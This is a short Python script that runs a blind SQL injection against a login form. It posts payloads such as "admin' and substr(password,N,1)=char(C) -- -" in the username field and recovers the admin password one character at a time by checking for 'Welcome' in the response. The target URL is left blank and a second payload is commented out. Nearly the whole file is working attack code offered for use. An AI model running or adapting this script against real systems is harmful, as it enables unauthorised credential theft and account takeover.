#-*- coding:UTF-8 -*-
import requests 

target = ""
length = 0
code = 48

for length in range(1,100):
    for code in range(48,123):
        #payload = (("username", "admin' OR ASCII(SUBSTRING(password,0,1))="+str(code)+" -- -"),("password","azea"))
        payload = (("username","admin' and substr(password,"+str(length)+",1)=char("+str(code)+") -- -"),("password","aze"))
        res = requests.post(target, data=payload)
        
        
        if "Welcome" in res.text :
            print ("Length : ", str(length))
            print ("Code = ",str(code))
            print ("Result : ",res.text)
